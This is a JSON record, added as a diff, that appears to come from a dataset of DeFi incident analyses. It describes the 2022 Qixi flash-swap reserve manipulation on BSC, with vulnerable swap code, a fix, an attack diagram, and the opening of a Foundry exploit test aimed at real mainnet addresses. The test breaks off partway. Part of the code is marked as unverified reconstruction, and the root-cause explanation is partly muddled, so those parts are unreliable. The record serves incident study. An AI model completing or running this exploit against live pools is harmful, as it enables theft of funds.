@@ -1,0 +1,31 @@
+{
+ "id": "2022__2022-08_Qixi_FlashSwapManipulation",
+ "source_file": "2022/2022-08_Qixi_FlashSwapManipulation.md",
+ "title": "Qixi — Flash Swap Price Manipulation Attack Analysis",
+ "date": "2022-08-01",
+ "protocol": "QIXI Token",
+ "chain": "Binance Smart Chain",
+ "loss_raw": "~6.8 BNB",
+ "loss_usd": null,
+ "root_cause": "Transfer logic bug in QIXI token allows reserve manipulation during `pancakeCall` callback",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable Uniswap V2 style flash swap callback handling\n// Repayment validation after Pair.swap() callback:\nfunction swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external {\n    // Token transfers\n    if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out);\n    if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out);\n\n    // Callback invocation (when data is present)\n    if (data.length > 0) IUniswapV2Callee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);\n\n    // Repayment validation: check whether current balance is sufficient accounting for previous reserves and fees\n    uint256 balance0 = IERC20(_token0).balanceOf(address(this));\n    uint256 balance1 = IERC20(_token1).balanceOf(address(this));\n\n    // ❌ Due to QIXI's fee-on-transfer, actual deposited amount != transferred amount\n    // If attacker transfers large QIXI in callback, balance1 grows larger than reserve1\n    // This can be exploited to bypass the K invariant\n    uint256 amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n    uint256 amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n\n    require(\n        uint256(balance0 - amount0In * 3/1000) * uint256(balance1 - amount1In * 3/1000) >=\n        uint256(_reserve0) * uint256(_reserve1),\n        'K'\n    );\n}",
+  "// ❌ RECONSTRUCTED — not verified source. QIXI token _transfer (fee-on-transfer pattern)\n// The transfer burns or takes a fee, so the pair's balanceOf(QIXI) increases by LESS than\n// the amount passed to transfer(), breaking the pair's accounting assumptions.\nfunction _transfer(address sender, address recipient, uint256 amount) internal override {\n    uint256 feeAmount = amount * _feeRate / 100; // e.g. 5–10% fee taken on every transfer\n    super._transfer(sender, address(this), feeAmount); // fee to contract\n    super._transfer(sender, recipient, amount - feeAmount); // ❌ pair receives less than `amount`\n}\n\n// Standard PancakeSwap V2 swap() — K check after callback:\n// (from PancakeSwap V2 source — same as Uniswap V2)\nfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n    // ... optimistic send of WBNB to attacker ...\n    if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);\n    // After callback: attacker has transferred large amount of QIXI into pair\n    uint balance0 = IERC20(_token0).balanceOf(address(this)); // WBNB — low (most sent out)\n    uint balance1 = IERC20(_token1).balanceOf(address(this)); // QIXI — very high (attacker dumped tokens in)\n    uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n    uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n    // K check: (balance0 - amount0In*3/1000) * (balance1 - amount1In*3/1000) >= reserve0 * reserve1\n    // ❌ balance1 (QIXI) is so large that balance1_adj >> reserve1,\n    //    meaning balance0_adj can be tiny — far less WBNB than borrowed — and K still passes\n    require(\n        uint(balance0.sub(amount0In.mul(3)/1000)).mul(balance1.sub(amount1In.mul(3)/1000)) >=\n        uint(_reserve0).mul(_reserve1),\n        'Pancake: K'\n    );\n}"
+ ],
+ "code_after": [
+  "// ✅ Fix: measure actual received amount via pre/post balance diff; never rely on transfer() amount\nuint256 before = IERC20(token).balanceOf(address(this));\nIERC20(token).transferFrom(sender, address(this), amount);\nuint256 actualReceived = IERC20(token).balanceOf(address(this)) - before;\n// Use actualReceived, not amount, in all K invariant calculations"
+ ],
+ "steps": [
+  "→ reserve1(QIXI) spikes",
+  "→ WBNB repayment amount reduced against K invariant baseline"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] WBNB/QIXI.swap(nearly all WBNB, 0, attacker, data)\n    │       └─ Flash swap executed, WBNB borrowed\n    │\n    ├─[2] pancakeCall() callback entered\n    │       │\n    │       └─ Large amount of QIXI tokens transferred to pair contract\n    │           → reserve1(QIXI) spikes\n    │           → WBNB repayment amount reduced against K invariant baseline\n    │\n    ├─[3] swap() validation passes with reduced WBNB repayment\n    │       └─ K invariant: (balance0 * balance1 >= reserve0 * reserve1)\n    │           balance1 is so large that even small balance0(WBNB) passes\n    │\n    └─[4] WBNB profit = borrowed amount - repaid amount ≈ 6.8 BNB",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n    function transfer(address, uint256) external returns (bool);\n}\n\ninterface IPancakePair {\n    function swap(uint256, uint256, address, bytes calldata) external;\n    function getReserves() external view returns (uint112, uint112, uint32);\n}\n\ncontract QixiExploit is Test {\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 QIXI = IERC20(0x65F11B2de17c4af7A8f70858D6CcB63AAC215601);\n    IPancakePair pair = IPancakePair(0x88fF4f62A75733C0f5afe58672121568a680DE84);\n\n    function setUp() public {\n        vm.createSelectFork(\"bsc\", 20_120_884);\n    }\n\n    function testExploit() public {\n  "
+ ]
+}
